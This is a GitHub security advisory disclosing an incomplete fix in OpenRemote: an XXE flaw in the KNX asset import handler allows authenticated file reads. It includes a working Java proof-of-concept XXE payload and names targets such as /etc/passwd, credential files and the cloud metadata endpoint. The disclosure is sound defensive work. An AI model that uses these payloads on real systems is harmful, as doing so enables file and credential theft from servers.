# [H] OpenRemote has an incomplete fix for CVE-2026-40882: XXE in KNXProtocol.startAssetImport() allows arbitrary file read via unprotected XMLInputFactory

## Summary
Severity: High
Advisory: GHSA-7v6w-c3f4-9wpq
CVE: CVE-2026-54640
CWE: CWE-611
Ecosystem: Maven
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:L (CVSS_V3)
Published: 2026-07-06
Source: https://github.com/advisories/GHSA-7v6w-c3f4-9wpq
Type: github-advisory

## Affected
- Maven: `io.openremote:openremote-agent` — affected >=0 <1.24.2

## Details
### Summary
The fix for CVE-2026-40882 addressed only the Velbus asset import handler. The KNX asset import handler (`KNXProtocol`) processes user-uploaded ETS project ZIP files through Saxon XSLT and `XMLInputFactory.newInstance()` with no XXE protection, allowing any authenticated user to read arbitrary files from the server filesystem (e.g. `/etc/passwd`, `openmrs-runtime.properties`, cloud credential files).

### Details
### Incomplete patch

CVE-2026-40882 was fixed by introducing `createSecureDocumentBuilderFactory()` in `AbstractVelbusProtocol.java` with five XXE-blocking features. The parallel asset import handler in `KNXProtocol.java` was not updated and retains two unprotected XML parsing calls on the same user-controlled data.

**Patched file — AbstractVelbusProtocol.java:**

```java
private DocumentBuilderFactory createSecureDocumentBuilderFactory() {
    DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
    factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);
    factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
    factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
    factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
    factory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
    return factory;
}
```

**Vulnerable file — KNXProtocol.java, lines 229–249:**

```java
// Line 229-230: reads 0.xml from user-uploaded ZIP
InputStream inputStream = KNXProtocol.class.getResourceAsStream(".../ets_calimero_group_name.xsl");
String xsd = IOUtils.toString(inputStream, StandardCharsets.UTF_8);

// Lines 233-245: Saxon XSLT — no XXE protection on the source document
TransformerFactory tfactory = new TransformerFactoryImpl();
Transformer transformer = tfactory.newTransformer(new StreamSource(new StringReader(xsd)));
transformer.transform(
    new StreamSource(new StringReader(xml)),  // xml = 0.xml from attacker's ZIP
    new StreamResult(writer));

// Line 249: XMLInputFactory — no SUPPORT_DTD=false, no IS_SUPPORTING_EXTERNAL_ENTITIES=false
try (final XmlReader r = XmlInputFactory.newInstance()
        .createXMLStreamReader(new StringReader(xml))) { ... }
```

### Data flow

```
POST /api/{realm}/agent/{agentId}/import   (authenticated user, PR:L)
  → AgentResourceImpl.doProtocolAssetImport(fileData)
  → KNXProtocol.startAssetImport(byte[] fileData)
  → ZipInputStream reads 0.xml from attacker-controlled ETS ZIP
  → Saxon TransformerFactoryImpl.transform(StreamSource(0.xml))  ← XXE stage 1
  → XmlInputFactory.newInstance().createXMLStreamReader(xml)     ← XXE stage 2
  → external entity resolved → arbitrary file read
```

### Comparison with patched code

| Handler | XML parser | DTD disabled | Status |
|---|---|---|---|
| `AbstractVelbusProtocol` | `DocumentBuilderFactory` | ✅ 5 features set | Patched (CVE-2026-40882) |
| `KNXProtocol` | `Saxon` + `XMLInputFactory` | ❌ none set | **Not patched** |


### PoC
No full OpenRemote installation required. The following reproduces the vulnerable XML processing chain using the exact same library versions.

**Requirements:** Java 17+, Maven 3.8+

**pom.xml dependency:**
```xml
<dependency>
    <groupId>net.sf.saxon</groupId>
    <artifactId>Saxon-HE</artifactId>
    <version>12.9</version>
</dependency>
```

**Exploit.java:**
```java
import net.sf.saxon.TransformerFactoryImpl;
import javax.xml.stream.*;
import javax.xml.transform.*;
import javax.xml.transform.stream.*;
import java.io.*;
import java.nio.file.*;

public class Exploit {
    public static void main(String[] args) throws Exception {

        // Sentinel file — proves arbitrary file read
        Path sentinel = Files.createTempFile("openremote_xxe_proof_", ".txt");
        String tag = "OPENREMOTE_KNX_XXE_" + System.currentTimeMillis();
        Files.writeString(sentinel, tag);

        String maliciousXml =
            "<?xml version=\"1.0\"?>\n" +
            "<!DOCTYPE root [\n" +
            "  <!ENTITY xxe SYSTEM \"file://" + sentinel.toAbsolutePath() + "\">\n" +
            "]>\n" +
            "<root><data>&xxe;</data></root>";

        // Stage A: XMLInputFactory (KNXProtocol.java:249 — no security config)
        XMLInputFactory factory = XMLInputFactory.newInstance();
        XMLStreamReader reader = factory.createXMLStreamReader(new StringReader(maliciousXml));
        StringBuilder sb = new StringBuilder();
        while (reader.hasNext()) {
            int e = reader.next();
            if (e == XMLStreamConstants.CHARACTERS) sb.append(reader.getText());
        }
        System.out.println("Stage A result: " + sb.toString().trim());

        // Stage B: Saxon TransformerFactoryImpl (KNXProtocol.java:233-245)
        String xsl = "<?xml version=\"1.0\"?>" +
            "<xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\">" +
            "<xsl:output method=\"text\"/>" +
            "<xsl:template match=\"/\"><xsl:value-of select=\"root/data\"/></xsl:template>" +
            "</xsl:stylesheet>";
        TransformerFactory tf = new TransformerFactoryImpl();
        StringWriter writer = new StringWriter();
        tf.newTransformer(new StreamSource(new StringReader(xsl)))
          .transform(new StreamSource(new StringReader(maliciousXml)), new StreamResult(writer));
        System.out.println("Stage B result: " + writer.toString().trim());

        Files.deleteIfExists(sentinel);
    }
}
```

**Build and run:**
```bash
mvn clean package -q
java -jar target/openremote-xxe-1.0.jar
```

**Verified output (JDK 21, Linux):**
```
Stage A result: OPENREMOTE_KNX_XXE_1780611779589
Stage B result: OPENREMOTE_KNX_XXE_1780611779589
```

Both stages print the sentinel file's contents, confirming that an external entity referencing a local file is resolved without restriction.


### Impact
**Vulnerability type:** XML External Entity (XXE) injection leading to arbitrary file read and potential server-side request forgery (SSRF).

**Who is impacted:** Any OpenRemote deployment that exposes the Manager API to authenticated users. The import endpoint requires only a valid session (PR:L), not administrator access. An attacker with a regular account in any realm can exploit this to read files accessible to the JVM process user, including:

- `/etc/passwd` — user enumeration
- Application configuration files containing database credentials or API keys
- Cloud provider metadata endpoints via SSRF (`http://169.254.169.254/...`)
- Internal service endpoints reachable from the server

The vulnerability is present in `KNXProtocol`, a built-in protocol handler shipped with every OpenRemote installation that includes the agent module. No special configuration is required to be exposed to this attack.

## References
- https://github.com/openremote/openremote/security/advisories/GHSA-7v6w-c3f4-9wpq
- https://github.com/openremote/openremote/commit/c28d3c60ebc2da68d9b6c4a6d7a5ad875a255ee9
- https://github.com/openremote/openremote
